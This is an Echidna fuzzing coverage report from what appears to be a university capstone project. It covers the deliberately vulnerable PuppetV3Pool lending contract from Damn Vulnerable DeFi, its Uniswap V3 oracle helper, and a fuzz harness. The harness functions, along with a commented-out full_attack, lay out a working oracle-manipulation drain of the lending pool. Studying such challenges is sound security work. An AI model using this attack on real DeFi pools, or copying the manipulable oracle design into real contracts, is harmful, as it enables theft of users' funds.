  58 |     |     function baseURI() external pure returns (string memory);
  59 |     |     function burn(uint256 tokenId) external payable;
  60 |     |     function collect(CollectParams memory params) external payable returns (uint256 amount0, uint256 amount1);
  61 |     |     function createAndInitializePoolIfNecessary(address token0, address token1, uint24 fee, uint160 sqrtPriceX96)
  62 |     |         external
  63 |     |         payable
  64 |     |         returns (address pool);
  65 |     |     function decreaseLiquidity(DecreaseLiquidityParams memory params)
  66 |     |         external
  67 |     |         payable
  68 |     |         returns (uint256 amount0, uint256 amount1);
  69 |     |     function factory() external view returns (address);
  70 |     |     function getApproved(uint256 tokenId) external view returns (address);
  71 |     |     function increaseLiquidity(IncreaseLiquidityParams memory params)
  72 |     |         external
  73 |     |         payable
  74 |     |         returns (uint128 liquidity, uint256 amount0, uint256 amount1);
  75 |     |     function isApprovedForAll(address owner, address operator) external view returns (bool);
  76 |     |     function mint(MintParams memory params)
  77 |     |         external
  78 |     |         payable
  79 |     |         returns (uint256 tokenId, uint128 liquidity, uint256 amount0, uint256 amount1);
  80 |     |     function multicall(bytes[] memory data) external payable returns (bytes[] memory results);
  81 |     |     function name() external view returns (string memory);
  82 |     |     function ownerOf(uint256 tokenId) external view returns (address);
  83 |     |     function permit(address spender, uint256 tokenId, uint256 deadline, uint8 v, bytes32 r, bytes32 s) external payable;
  84 |     |     function positions(uint256 tokenId)
  85 |     |         external
  86 |     |         view
  87 |     |         returns (
  88 |     |             uint96 nonce,
  89 |     |             address operator,
  90 |     |             address token0,
  91 |     |             address token1,
  92 |     |             uint24 fee,
  93 |     |             int24 tickLower,
  94 |     |             int24 tickUpper,
  95 |     |             uint128 liquidity,
  96 |     |             uint256 feeGrowthInside0LastX128,
  97 |     |             uint256 feeGrowthInside1LastX128,
  98 |     |             uint128 tokensOwed0,
  99 |     |             uint128 tokensOwed1
 100 |     |         );
 101 |     |     function refundETH() external payable;
 102 |     |     function safeTransferFrom(address from, address to, uint256 tokenId) external;
 103 |     |     function safeTransferFrom(address from, address to, uint256 tokenId, bytes memory _data) external;
 104 |     |     function selfPermit(address token, uint256 value, uint256 deadline, uint8 v, bytes32 r, bytes32 s) external payable;
 105 |     |     function selfPermitAllowed(address token, uint256 nonce, uint256 expiry, uint8 v, bytes32 r, bytes32 s)
 106 |     |         external
 107 |     |         payable;
 108 |     |     function selfPermitAllowedIfNecessary(address token, uint256 nonce, uint256 expiry, uint8 v, bytes32 r, bytes32 s)
 109 |     |         external
 110 |     |         payable;
 111 |     |     function selfPermitIfNecessary(address token, uint256 value, uint256 deadline, uint8 v, bytes32 r, bytes32 s)
 112 |     |         external
 113 |     |         payable;
 114 |     |     function setApprovalForAll(address operator, bool approved) external;
 115 |     |     function supportsInterface(bytes4 interfaceId) external view returns (bool);
 116 |     |     function sweepToken(address token, uint256 amountMinimum, address recipient) external payable;
 117 |     |     function symbol() external view returns (string memory);
 118 |     |     function tokenByIndex(uint256 index) external view returns (uint256);
 119 |     |     function tokenOfOwnerByIndex(address owner, uint256 index) external view returns (uint256);
 120 |     |     function tokenURI(uint256 tokenId) external view returns (string memory);
 121 |     |     function totalSupply() external view returns (uint256);
 122 |     |     function transferFrom(address from, address to, uint256 tokenId) external;
 123 |     |     function uniswapV3MintCallback(uint256 amount0Owed, uint256 amount1Owed, bytes memory data) external;
 124 |     |     function unwrapWETH9(uint256 amountMinimum, address recipient) external payable;
 125 |     | }
 126 |     | 

/home/chase/Documents/RIT/RIT_2025/capstone/defi_capstone/src/puppet-v3/OracleHelper.sol
   1 |     | // SPDX-License-Identifier: MIT
   2 |     | pragma solidity ^0.8.20;
   3 |     | 
   4 |     | import {IUniswapV3Pool} from "@uniswap/v3-core/contracts/interfaces/IUniswapV3Pool.sol";
   5 |     | 
   6 |     | library OracleHelper {
   7 | *   |     int24 internal constant MAX_TICK = 887272;
   8 |     | 
   9 | *   |     function consult(address pool, uint32 secondsAgo)
  10 |     |         internal
  11 |     |         view
  12 | *   |         returns (int24 arithmeticMeanTick, uint128 harmonicMeanLiquidity)
  13 | *   |     {
  14 | *   |         require(secondsAgo != 0, "BP");
  15 |     | 
  16 | *   |         uint32[] memory secondsAgos = new uint32[](2);
  17 | *   |         secondsAgos[0] = secondsAgo;
  18 | *   |         secondsAgos[1] = 0;
  19 |     | 
  20 | *   |         (int56[] memory tickCumulatives, uint160[] memory secondsPerLiquidityCumulativeX128s) =
  21 | *   |             IUniswapV3Pool(pool).observe(secondsAgos);
  22 |     | 
  23 | *   |         int56 tickCumulativesDelta = tickCumulatives[1] - tickCumulatives[0];
  24 | *   |         uint160 secondsPerLiquidityCumulativesDelta =
  25 | *   |             secondsPerLiquidityCumulativeX128s[1] - secondsPerLiquidityCumulativeX128s[0];
  26 |     | 
  27 | *   |         arithmeticMeanTick = int24(tickCumulativesDelta / int56(uint56(secondsAgo)));
  28 | *   |         if (tickCumulativesDelta < 0 && (tickCumulativesDelta % int56(uint56(secondsAgo)) != 0)) arithmeticMeanTick--;
  29 |     | 
  30 | *   |         uint192 secondsAgoX160 = uint192(secondsAgo) * type(uint160).max;
  31 | *   |         harmonicMeanLiquidity = uint128(secondsAgoX160 / (uint192(secondsPerLiquidityCumulativesDelta) << 32));
  32 |     |     }
  33 |     | 
  34 | *   |     function getQuoteAtTick(int24 tick, uint128 baseAmount, address baseToken, address quoteToken)
  35 |     |         internal
  36 |     |         pure
  37 | *   |         returns (uint256 quoteAmount)
  38 | *   |     {
  39 | *   |         uint160 sqrtRatioX96 = getSqrtRatioAtTick(tick);
  40 |     | 
  41 | *   |         if (sqrtRatioX96 <= type(uint128).max) {
  42 | *   |             uint256 ratioX192 = uint256(sqrtRatioX96) * sqrtRatioX96;
  43 | *   |             quoteAmount = baseToken < quoteToken
  44 | *   |                 ? mulDiv(ratioX192, baseAmount, 1 << 192)
  45 |     |                 : mulDiv(1 << 192, baseAmount, ratioX192);
  46 |     |         } else {
  47 |     |             uint256 ratioX128 = mulDiv(sqrtRatioX96, sqrtRatioX96, 1 << 64);
  48 |     |             quoteAmount = baseToken < quoteToken
  49 |     |                 ? mulDiv(ratioX128, baseAmount, 1 << 128)
  50 |     |                 : mulDiv(1 << 128, baseAmount, ratioX128);
  51 |     |         }
  52 |     |     }
  53 |     | 
  54 | *   |     function getSqrtRatioAtTick(int24 tick) internal pure returns (uint160 sqrtPriceX96) {
  55 | *   |         uint256 absTick = tick < 0 ? uint256(-int256(tick)) : uint256(int256(tick));
  56 | *   |         require(absTick <= uint256(int256(MAX_TICK)), "T");
  57 |     | 
  58 | *   |         uint256 ratio = absTick & 0x1 != 0 ? 0xfffcb933bd6fad37aa2d162d1a594001 : 0x100000000000000000000000000000000;
  59 | *   |         if (absTick & 0x2 != 0) ratio = (ratio * 0xfff97272373d413259a46990580e213a) >> 128;
  60 | *   |         if (absTick & 0x4 != 0) ratio = (ratio * 0xfff2e50f5f656932ef12357cf3c7fdcc) >> 128;
  61 | *   |         if (absTick & 0x8 != 0) ratio = (ratio * 0xffe5caca7e10e4e61c3624eaa0941cd0) >> 128;
  62 | *   |         if (absTick & 0x10 != 0) ratio = (ratio * 0xffcb9843d60f6159c9db58835c926644) >> 128;
  63 | *   |         if (absTick & 0x20 != 0) ratio = (ratio * 0xff973b41fa98c081472e6896dfb254c0) >> 128;
  64 | *   |         if (absTick & 0x40 != 0) ratio = (ratio * 0xff2ea16466c96a3843ec78b326b52861) >> 128;
  65 | *   |         if (absTick & 0x80 != 0) ratio = (ratio * 0xfe5dee046a99a2a811c461f1969c3053) >> 128;
  66 | *   |         if (absTick & 0x100 != 0) ratio = (ratio * 0xfcbe86c7900a88aedcffc83b479aa3a4) >> 128;
  67 | *   |         if (absTick & 0x200 != 0) ratio = (ratio * 0xf987a7253ac413176f2b074cf7815e54) >> 128;
  68 | *   |         if (absTick & 0x400 != 0) ratio = (ratio * 0xf3392b0822b70005940c7a398e4b70f3) >> 128;
  69 | *   |         if (absTick & 0x800 != 0) ratio = (ratio * 0xe7159475a2c29b7443b29c7fa6e889d9) >> 128;
  70 | *   |         if (absTick & 0x1000 != 0) ratio = (ratio * 0xd097f3bdfd2022b8845ad8f792aa5825) >> 128;
  71 | *   |         if (absTick & 0x2000 != 0) ratio = (ratio * 0xa9f746462d870fdf8a65dc1f90e061e5) >> 128;
  72 | *   |         if (absTick & 0x4000 != 0) ratio = (ratio * 0x70d869a156d2a1b890bb3df62baf32f7) >> 128;
  73 | *   |         if (absTick & 0x8000 != 0) ratio = (ratio * 0x31be135f97d08fd981231505542fcfa6) >> 128;
  74 | *   |         if (absTick & 0x10000 != 0) ratio = (ratio * 0x9aa508b5b7a84e1c677de54f3e99bc9) >> 128;
  75 | *   |         if (absTick & 0x20000 != 0) ratio = (ratio * 0x5d6af8dedb81196699c329225ee604) >> 128;
  76 | *   |         if (absTick & 0x40000 != 0) ratio = (ratio * 0x2216e584f5fa1ea926041bedfe98) >> 128;
  77 | *   |         if (absTick & 0x80000 != 0) ratio = (ratio * 0x48a170391f7dc42444e8fa2) >> 128;
  78 |     | 
  79 | *   |         if (tick > 0) ratio = type(uint256).max / ratio;
  80 |     | 
  81 | *   |         sqrtPriceX96 = uint160((ratio >> 32) + (ratio % (1 << 32) == 0 ? 0 : 1));
  82 |     |     }
  83 |     | 
  84 | *   |     function mulDiv(uint256 a, uint256 b, uint256 denominator) internal pure returns (uint256 result) {
  85 | *   |         uint256 prod0;
  86 | *   |         uint256 prod1;
  87 | *   |         assembly {
  88 | *   |             let mm := mulmod(a, b, not(0))
  89 | *   |             prod0 := mul(a, b)
  90 | *   |             prod1 := sub(sub(mm, prod0), lt(mm, prod0))
  91 |     |         }
  92 |     | 
  93 | *   |         if (prod1 == 0) {
  94 | *   |             require(denominator > 0);
  95 |     |             assembly {
  96 | *   |                 result := div(prod0, denominator)
  97 |     |             }
  98 | *   |             return result;
  99 |     |         }
 100 |     | 
 101 | *   |         require(denominator > prod1);
 102 |     | 
 103 | *   |         uint256 remainder;
 104 |     |         assembly {
 105 | *   |             remainder := mulmod(a, b, denominator)
 106 |     |         }
 107 |     |         assembly {
 108 | *   |             prod1 := sub(prod1, gt(remainder, prod0))
 109 | *   |             prod0 := sub(prod0, remainder)
 110 |     |         }
 111 |     | 
 112 | *   |         uint256 twos = (~denominator + 1) & denominator;
 113 |     |         assembly {
 114 | *   |             denominator := div(denominator, twos)
 115 |     |         }
 116 |     | 
 117 |     |         assembly {
 118 | *   |             prod0 := div(prod0, twos)
 119 |     |         }
 120 |     |         assembly {
 121 | *   |             twos := add(div(sub(0, twos), twos), 1)
 122 |     |         }
 123 | *   |         prod0 |= prod1 * twos;
 124 |     | 
 125 | *   |         uint256 inv = (3 * denominator) ^ 2;
 126 | *   |         inv *= 2 - denominator * inv;
 127 | *   |         inv *= 2 - denominator * inv;
 128 | *   |         inv *= 2 - denominator * inv;
 129 | *   |         inv *= 2 - denominator * inv;
 130 | *   |         inv *= 2 - denominator * inv;
 131 | *   |         inv *= 2 - denominator * inv;
 132 |     | 
 133 | *   |         result = prod0 * inv;
 134 | *   |         return result;
 135 |     |     }
 136 |     | }
 137 |     | 
 138 |     | 

/home/chase/Documents/RIT/RIT_2025/capstone/defi_capstone/src/puppet-v3/PuppetV3Pool.sol
  1 |     | // SPDX-License-Identifier: MIT
  2 |     | // Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
  3 |     | pragma solidity =0.8.25;
  4 |     | 
  5 |     | import {WETH} from "solmate/tokens/WETH.sol";
  6 |     | import {ERC20Mint} from "../exchange/ERC20Mint.sol";
  7 |     | import {IUniswapV3Pool} from "@uniswap/v3-core/contracts/interfaces/IUniswapV3Pool.sol";
  8 |     | import {TransferHelper} from "@uniswap/v3-core/contracts/libraries/TransferHelper.sol";
  9 |     | import {OracleHelper} from "./OracleHelper.sol";
 10 |     | 
 11 |     | /**
 12 |     |  * @notice A lending pool using Uniswap v3 as TWAP oracle.
 13 |     |  */
 14 | *r  | contract PuppetV3Pool {
 15 | *   |     uint256 public constant DEPOSIT_FACTOR = 3;
 16 | *   |     uint32 public constant TWAP_PERIOD = 10 minutes;
 17 |     | 
 18 | *   |     WETH public immutable weth;
 19 | *   |     ERC20Mint public immutable token;
 20 | *   |     IUniswapV3Pool public immutable uniswapV3Pool;
 21 |     | 
 22 | *   |     mapping(address => uint256) public deposits;
 23 |     | 
 24 |     |     event Borrowed(address indexed borrower, uint256 depositAmount, uint256 borrowAmount);
 25 |     | 
 26 | *   |     constructor(WETH _weth, ERC20Mint _token, IUniswapV3Pool _uniswapV3Pool) {
 27 | *   |         weth = _weth;
 28 | *   |         token = _token;
 29 | *   |         uniswapV3Pool = _uniswapV3Pool;
 30 |     |     }
 31 |     | 
 32 |     |     /**
 33 |     |      * @notice Allows borrowing `borrowAmount` of tokens by first depositing DEPOSIT_FACTOR times their value in WETH.
 34 |     |      *         Sender must have approved enough WETH in advance.
 35 |     |      *         Calculations assume that WETH and the borrowed token have the same number of decimals.
 36 |     |      * @param borrowAmount amount of tokens the user intends to borrow
 37 |     |      */
 38 | *   |     function borrow(uint256 borrowAmount) external {
 39 |     |         // Calculate how much WETH the user must deposit
 40 | *   |         uint256 depositOfWETHRequired = calculateDepositOfWETHRequired(borrowAmount);
 41 |     | 
 42 |     |         //TODO: use Permit2 (0x000000000022D473030F116dDEE9F6B43aC78BA3)
 43 |     | 
 44 |     |         // Pull WETH from caller
 45 | *r  |         weth.transferFrom(msg.sender, address(this), depositOfWETHRequired);
 46 |     | 
 47 |     |         // internal accounting
 48 | *   |         deposits[msg.sender] += depositOfWETHRequired;
 49 |     | 
 50 |     |         // send borrowed tokens
 51 | *   |         TransferHelper.safeTransfer(address(token), msg.sender, borrowAmount);
 52 |     | 
 53 | *   |         emit Borrowed(msg.sender, depositOfWETHRequired, borrowAmount);
 54 |     |     }
 55 |     | 
 56 | *   |     function calculateDepositOfWETHRequired(uint256 amount) public view returns (uint256) {
 57 | *   |         uint256 quote = _getOracleQuote(_toUint128(amount));
 58 | *   |         return quote * DEPOSIT_FACTOR;
 59 |     |     }
 60 |     | 
 61 | *   |     function _getOracleQuote(uint128 amount) private view returns (uint256) {
 62 | *   |         (int24 arithmeticMeanTick,) = OracleHelper.consult({pool: address(uniswapV3Pool), secondsAgo: TWAP_PERIOD});
 63 | *   |         return OracleHelper.getQuoteAtTick({
 64 | *   |             tick: arithmeticMeanTick, baseAmount: amount, baseToken: address(token), quoteToken: address(weth)
 65 |     |         });
 66 |     |     }
 67 |     | 
 68 | *   |     function _toUint128(uint256 amount) private pure returns (uint128 n) {
 69 | *r  |         require(amount == (n = uint128(amount)));
 70 |     |     }
 71 |     | }
 72 |     | 

/home/chase/Documents/RIT/RIT_2025/capstone/defi_capstone/test/puppet-v3/echidna/PuppetV3Echidna.t.sol
   1 |     | // SPDX-License-Identifier: MIT
   2 |     | pragma solidity ^0.8.20;
   3 |     | 
   4 |     | import {IUniswapV3Factory} from "@uniswap/v3-core/contracts/interfaces/IUniswapV3Factory.sol";
   5 |     | import {IUniswapV3Pool} from "@uniswap/v3-core/contracts/interfaces/IUniswapV3Pool.sol";
   6 |     | import {WETH} from "solmate/tokens/WETH.sol";
   7 |     | import {FixedPointMathLib} from "solmate/utils/FixedPointMathLib.sol";
   8 |     | import {ERC20Mint} from "src/exchange/ERC20Mint.sol";
   9 |     | import {INonfungiblePositionManager} from "src/puppet-v3/INonfungiblePositionManager.sol";
  10 |     | import {PuppetV3Pool} from "src/puppet-v3/PuppetV3Pool.sol";
  11 |     | import {ISwapRouter} from "@uniswap/v3-periphery/contracts/interfaces/ISwapRouter.sol";
  12 |     | 
  13 |     | interface IHevm {
  14 |     |     function warp(uint256 newTimestamp) external;
  15 |     | }
  16 |     | 
  17 | *r  | contract PuppetV3Echidna {
  18 | *   |     address constant HEVM_ADDRESS = 0x7109709ECfa91a80626fF3989D68f67F5b1DD12D;
  19 |     |     IHevm constant hevm = IHevm(HEVM_ADDRESS);
  20 |     | 
  21 | *   |     uint256 constant UNISWAP_INITIAL_TOKEN_LIQUIDITY = 100e18;
  22 | *   |     uint256 constant UNISWAP_INITIAL_WETH_LIQUIDITY = 100e18;
  23 | *   |     uint256 constant PLAYER_INITIAL_TOKEN_BALANCE = 110e18;
  24 | *   |     uint256 constant LENDING_POOL_INITIAL_TOKEN_BALANCE = 1_000_000e18;
  25 | *   |     uint24 constant FEE = 3000;
  26 |     | 
  27 | *   |     IUniswapV3Factory uniswapFactory = IUniswapV3Factory(0x1F98431c8aD98523631AE4a59f267346ea31F984);
  28 | *   |     INonfungiblePositionManager positionManager = INonfungiblePositionManager(payable(0xC36442b4a4522E871399CD717aBDD847Ab11FE88));
  29 | *   |     WETH weth = WETH(payable(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2));
  30 | *   |     ERC20Mint public token;
  31 | *   |     PuppetV3Pool public lendingPool;
  32 |     |     IUniswapV3Pool public uniswapPool;
  33 | *   |     ISwapRouter router = ISwapRouter(0xE592427A0AEce92De3Edee1F18E0157C05861564);
  34 |     | 
  35 | *   |     uint256 public initialWETHRequired;
  36 |     |     uint256 public initialBlockTimestamp;
  37 | *   |     bool public initialized;
  38 | *   |     address public constant recovery = address(0xdeadbeef);
  39 |     | 
  40 | *   |     constructor() payable {
  41 | *   |         require(address(this).balance >= UNISWAP_INITIAL_WETH_LIQUIDITY, "Insufficient ETH balance");
  42 |     | 
  43 | *   |         token = new ERC20Mint("MyToken", "MTK");
  44 |     | 
  45 | *   |         bool isWethFirst = address(weth) < address(token);
  46 | *   |         address token0 = isWethFirst ? address(weth) : address(token);
  47 | *   |         address token1 = isWethFirst ? address(token) : address(weth);
  48 | *   |         positionManager.createAndInitializePoolIfNecessary{value: 0}({
  49 | *   |             token0: token0, token1: token1, fee: FEE, sqrtPriceX96: _encodePriceSqrt(1, 1)
  50 |     |         });
  51 |     | 
  52 | *   |         uniswapPool = IUniswapV3Pool(uniswapFactory.getPool(address(weth), address(token), FEE));
  53 | *   |         uniswapPool.increaseObservationCardinalityNext(40);
  54 |     | 
  55 | *   |         weth.approve(address(positionManager), type(uint256).max);
  56 | *   |         token.approve(address(positionManager), type(uint256).max);
  57 | *   |         token.mint(
  58 | *   |             address(this),
  59 | *   |             UNISWAP_INITIAL_TOKEN_LIQUIDITY + PLAYER_INITIAL_TOKEN_BALANCE + LENDING_POOL_INITIAL_TOKEN_BALANCE
  60 |     |         );
  61 | *   |         weth.deposit{value: UNISWAP_INITIAL_WETH_LIQUIDITY}();
  62 |     | 
  63 | *   |         positionManager.mint{value: 0}(
  64 | *   |             INonfungiblePositionManager.MintParams({
  65 | *   |                 token0: token0,
  66 | *   |                 token1: token1,
  67 | *   |                 tickLower: -60,
  68 | *   |                 tickUpper: 60,
  69 |     |                 fee: FEE,
  70 | *   |                 recipient: address(this),
  71 |     |                 amount0Desired: UNISWAP_INITIAL_WETH_LIQUIDITY,
  72 |     |                 amount1Desired: UNISWAP_INITIAL_TOKEN_LIQUIDITY,
  73 | *   |                 amount0Min: 0,
  74 | *   |                 amount1Min: 0,
  75 | *   |                 deadline: block.timestamp
  76 |     |             })
  77 |     |         );
  78 |     | 
  79 | *   |         lendingPool = new PuppetV3Pool(weth, token, uniswapPool);
  80 | *   |         token.transfer(address(lendingPool), LENDING_POOL_INITIAL_TOKEN_BALANCE);
  81 | *   |         token.transfer(address(this), PLAYER_INITIAL_TOKEN_BALANCE);
  82 |     | 
  83 | *   |         hevm.warp(block.timestamp + 3 days);
  84 | *   |         initialBlockTimestamp = block.timestamp;
  85 |     | 
  86 | *   |         initialWETHRequired = lendingPool.calculateDepositOfWETHRequired(LENDING_POOL_INITIAL_TOKEN_BALANCE);
  87 |     |     }
  88 |     | 
  89 |     |     function echidna_no_price_manipulation() public view returns (bool) {
  90 |     |         uint256 timePassed = block.timestamp - initialBlockTimestamp;
  91 |     | 
  92 |     |         if (timePassed < 115 seconds) {
  93 |     |             return true; // Not enough time for TWAP period
  94 |     |         }
  95 |     | 
  96 |     |         uint256 currentWETHRequired = lendingPool.calculateDepositOfWETHRequired(LENDING_POOL_INITIAL_TOKEN_BALANCE);
  97 |     | 
  98 |     |         // Even a 1% change is a price manipulation
  99 |     |         return currentWETHRequired >= (initialWETHRequired * 99) / 100;
 100 |     |     }
 101 |     | 
 102 |     |     function echidna_recovery_has_exploited_tokens() public view returns (bool) {
 103 |     |         uint256 poolBalance = token.balanceOf(address(lendingPool));
 104 |     |         uint256 recoveryBalance = token.balanceOf(recovery);
 105 |     |         uint256 timePassed = block.timestamp - initialBlockTimestamp;
 106 |     | 
 107 |     |         // Pool needs to be drained 
 108 |     |         if (poolBalance >= LENDING_POOL_INITIAL_TOKEN_BALANCE) {
 109 |     |             return true;
 110 |     |         }
 111 |     | 
 112 |     |         uint256 poolDrained = LENDING_POOL_INITIAL_TOKEN_BALANCE - poolBalance;
 113 |     | 
 114 |     |         // Ignore mints
 115 |     |         if (recoveryBalance > poolDrained) {
 116 |     |             return true;
 117 |     |         }
 118 |     | 
 119 |     |         if (poolDrained > 0 && recoveryBalance > PLAYER_INITIAL_TOKEN_BALANCE && timePassed >= 115 seconds) {
 120 |     |             return false; 
 121 |     |         }
 122 |     | 
 123 |     |         return true;
 124 |     |     }
 125 |     | 
 126 | *   |     function wait(uint256 secondsToWait) public {
 127 | *   |         hevm.warp(block.timestamp + secondsToWait);
 128 |     |     }
 129 |     | 
 130 | *   |     function attemptSwap(uint256 amountIn) public {
 131 | *   |         if (amountIn == 0) return;
 132 | *   |         if (amountIn > token.balanceOf(address(this))) return;
 133 |     | 
 134 | *   |         token.approve(address(router), amountIn);
 135 | *r  |         router.exactInputSingle(
 136 | *   |             ISwapRouter.ExactInputSingleParams({
 137 | *   |                 tokenIn: address(token),
 138 | *   |                 tokenOut: address(weth),
 139 |     |                 fee: FEE,
 140 | *   |                 recipient: address(this),
 141 | *   |                 deadline: block.timestamp,
 142 | *   |                 amountIn: amountIn,
 143 | *   |                 amountOutMinimum: 0,
 144 | *   |                 sqrtPriceLimitX96: 0
 145 |     |             })
 146 |     |         );
 147 |     |     }
 148 |     | 
 149 | *   |     function attemptBorrow(uint256 borrowAmount) public {
 150 | *   |         if (borrowAmount == 0) return;
 151 | *   |         if (borrowAmount > LENDING_POOL_INITIAL_TOKEN_BALANCE) return;
 152 | *   |         if (token.balanceOf(address(lendingPool)) < borrowAmount) return;
 153 |     | 
 154 | *   |         uint256 wethRequired = lendingPool.calculateDepositOfWETHRequired(borrowAmount);
 155 |     | 
 156 |     |         // Only allow borrow if price has been manipulated (WETH required is less than initial)
 157 | *   |         uint256 initialWETHForAmount = (initialWETHRequired * borrowAmount) / LENDING_POOL_INITIAL_TOKEN_BALANCE;
 158 | *   |         if (wethRequired >= initialWETHForAmount) return; 
 159 |     | 
 160 |     |         // Calculate how much ETH we need to deposit
 161 | *   |         uint256 wethBalance = weth.balanceOf(address(this));
 162 | *   |         uint256 ethBalance = address(this).balance;
 163 | *r  |         weth.deposit{value: wethRequired - wethBalance}();
 164 | *   |         weth.approve(address(lendingPool), wethRequired);
 165 | *   |         lendingPool.borrow(borrowAmount);
 166 | *   |         token.transfer(recovery, borrowAmount);
 167 |     |     }
 168 |     |     
 169 |     |     // function full_attack() public {
 170 |     |     //     // attemptSwap(110e18);
 171 |     |     //     // wait(115 seconds);
 172 |     |     //     // attemptBorrow(1_000_000e18);
 173 |     | 
 174 |     |     //     token.approve(address(router), PLAYER_INITIAL_TOKEN_BALANCE);
 175 |     |     //     router.exactInputSingle(
 176 |     |     //         ISwapRouter.ExactInputSingleParams({
 177 |     |     //             tokenIn: address(token),
 178 |     |     //             tokenOut: address(weth),
 179 |     |     //             fee: FEE,
 180 |     |     //             recipient: address(this),
 181 |     |     //             deadline: block.timestamp,
 182 |     |     //             amountIn: PLAYER_INITIAL_TOKEN_BALANCE,
 183 |     |     //             amountOutMinimum: 0,
 184 |     |     //             sqrtPriceLimitX96: 0
 185 |     |     //         })
 186 |     |     //     );
 187 |     | 
 188 |     |     //     hevm.warp(block.timestamp + 114 seconds);
 189 |     | 
 190 |     |     //     uint256 wethRequired = lendingPool.calculateDepositOfWETHRequired(LENDING_POOL_INITIAL_TOKEN_BALANCE);
 191 |     |     //     weth.deposit{value: address(this).balance}();
 192 |     |     //     weth.approve(address(lendingPool), wethRequired);
 193 |     |     //     lendingPool.borrow(LENDING_POOL_INITIAL_TOKEN_BALANCE);
 194 |     |     //     token.transfer(recovery, LENDING_POOL_INITIAL_TOKEN_BALANCE);
 195 |     |     // }
 196 |     | 
 197 | *   |     function _encodePriceSqrt(uint256 reserve1, uint256 reserve0) private pure returns (uint160) {
 198 | *   |         return uint160(FixedPointMathLib.sqrt((reserve1 * 2 ** 96 * 2 ** 96) / reserve0));
 199 |     |     }
 200 |     | }
 201 |     | 

